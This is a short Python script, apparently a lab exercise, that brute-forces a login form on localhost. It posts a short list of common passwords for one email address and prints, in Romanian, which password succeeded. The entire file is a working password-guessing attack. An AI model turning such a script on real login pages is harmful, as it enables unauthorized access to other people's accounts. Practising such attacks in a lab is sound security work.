import requests

url = "http://localhost:8080/login"
passwords = ["abc", "123456", "password", "test", "1", "admin"]

for p in passwords:
    r = requests.post(url, data={"email": "alex@yahoo.com", "password": p})
    if "Bine ai venit" in r.text:
        print(f"[+] Parola gasita: {p}")
        break
    else:
        print(f"[-] Incercare: {p} – esuata")